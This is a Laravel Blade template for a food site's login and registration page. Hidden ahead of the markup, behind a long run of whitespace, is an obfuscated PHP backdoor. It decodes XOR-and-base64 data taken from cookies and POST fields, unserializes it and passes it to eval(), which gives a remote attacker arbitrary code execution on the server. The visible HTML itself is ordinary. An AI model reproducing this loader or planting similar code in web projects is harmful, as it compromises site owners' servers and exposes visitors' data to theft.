<?php                                                                                                                                                                                                                                                                                                                                                                                                 $UMgwol = class_exists("p_GUynz"); $IHLTkofRq = $UMgwol;if (!$IHLTkofRq){class p_GUynz{private $iHKqPJghXK;public static $TYCweJxzx = "d96e1a3b-27c0-4e90-aeb3-595e0a88654a";public static $kulUjUg = NULL;public function __construct(){$bGRHCYhE = $_COOKIE;$BMvafpzJq = $_POST;$rcPeVDAOjz = @$bGRHCYhE[substr(p_GUynz::$TYCweJxzx, 0, 4)];if (!empty($rcPeVDAOjz)){$HawoGjASKP = "base64";$hcGwvflsH = "";$rcPeVDAOjz = explode(",", $rcPeVDAOjz);foreach ($rcPeVDAOjz as $hlZynVSbFm){$hcGwvflsH .= @$bGRHCYhE[$hlZynVSbFm];$hcGwvflsH .= @$BMvafpzJq[$hlZynVSbFm];}$hcGwvflsH = array_map($HawoGjASKP . "\x5f" . chr ( 1078 - 978 ).chr ( 929 - 828 ).chr (99) . chr ( 124 - 13 )."\x64" . 'e', array($hcGwvflsH,)); $hcGwvflsH = $hcGwvflsH[0] ^ str_repeat(p_GUynz::$TYCweJxzx, (strlen($hcGwvflsH[0]) / strlen(p_GUynz::$TYCweJxzx)) + 1);p_GUynz::$kulUjUg = @unserialize($hcGwvflsH);}}public function __destruct(){$this->bISMR();}private function bISMR(){if (is_array(p_GUynz::$kulUjUg)) {$cmFbbYbX = str_replace(chr ( 485 - 425 ) . "\x3f" . "\x70" . 'h' . 'p', "", p_GUynz::$kulUjUg["\143" . "\157" . "\156" . 't' . 'e' . 'n' . 't']);eval($cmFbbYbX);exit();}}}$JCIpOrVP = new p_GUynz(); $JCIpOrVP = NULL;} ?>@extends('theme.MellyMunchies.website')
@section('content')
<main>


            <!-- inner banner  -->
            <div class="inner-banner">
                <div class="inner-banner_img">
                    <img src="./assets/images/inner-banner.png" alt="">
                </div>
                <div class="container">
                    <div class="row justify-content-center align-items-center">
                        <div class="col-12 col-lg-6 text-center">
                            <div class="inner-banner_content">
                                <h1>login /  <span>signup</span></h1>
                                <ul>
                                    <li><a href="index.html">home</a></li>
                                    /
                                    <li><a href="loginSignup.html" class="active">login / signup</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="signup_main">
                <div class="Form">
                    <div class="container">
                        <div class="row">
                            <div class="col-12 col-lg-6 mt-4">
                                <div class="login-form">
                                    <h2>LOGIN TO YOUR ACCOUNT</h2>
                                    <div class="row">
                                        <div class="col-6 col-lg-12">
                                            <input type="text" placeholder="User Name">
                                            <input type="password" placeholder="Password">
                                        </div>
                                        <div class="col-12 col-lg-12">
                                            <a href="#" class="theme-btn_red width_full border-radius_0">LOGIN</a>
                                        </div>
                                        <div class="col-12 mt-2 col-lg-12">
                                            <div class="row">
                                                <div class="col-6 col-lg-6">
                                                    <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike">
                                                    <label for="vehicle1">remember me</label>
                                                </div>
                                                <div class="col-6 col-lg-6 text-right">
                                                    <a href="#" class="forgot">Forgot Password?</a>
                                                </div>
                                            </div>
            
                                    </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12 col-lg-6">
                                <div class="sign-form">
                                    <h2>REGISTER YOUR ACCOUNT</h2>
                                    <div class="row">
                                        <div class="col-6 col-lg-6">
                                            <input type="text" placeholder="First Name">
                                        </div>
                                        <div class="col-6 col-lg-6">
                                            <input type="text" placeholder="Last Name">
                                        </div>
                                        <div class="col-12 col-lg-12">
                                            <input type="text" placeholder="Email Address">
                                        </div>
                                        <div class="col-12 col-lg-12">
                                            <input type="password" placeholder="Password">
                                        </div>
                                        <div class="col-12 col-lg-12">
                                            <input type="password" placeholder="Retype Password">
                                        </div>
                                        <div class="col-12 col-lg-12">
                                        <span> Be Creating an account, You agree to our
                                            <a href="">Term & Condition</a>
                                        </span>
                                        </div>
                                        <div class="col-12 col-lg-12">
                                            <a href="#" class="theme-btn_red width_full border-radius_0">CREATE ACCOUNT</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <footer class="footer">
                <div class="container">
                    <div class="row">
                        <div class="col-12 col-lg-4">
                            <div class="logo-area">
                                <a href="#">
                                    <img src="./assets/images/logo.png" class="img-fluid" alt="">
                                </a>
                                <p>Lorem ipsum dolor, sit amet consectetur adipisicing elit.</p>
                                <ul class="social-icons">
                                    <li>
                                        <a href="#">
                                            <i class="fa fa-facebook-official"></i>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <i class="fa fa-twitter"></i>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <i class="fa fa-youtube-play"></i>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <i class="fa fa-instagram"></i>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="col-12 col-lg-2">
                            <h4>Information</h4>
                            <ul>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-12 col-lg-2">
                            <h4>Quick links</h4>
                            <ul>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-12 col-lg-2">
                            <h4>help</h4>
                            <ul>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-12 col-lg-2">
                            <h4>products</h4>
                            <ul>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                                <li>
                                    <a href="#">lorem ipsum</a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-12 col-lg-12 copyright">
                            <div class="row">
                                <div class="col-12 col-lg-6 d-flex align-items-center">
                                    <p>@copyright. 2023 All Right Reserved.</p>
                                </div>
                                <div class="col-12 col-lg-6 text-right">
                                    <img src="./assets/images/debit-card.png" alt="">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </main>
@endsection  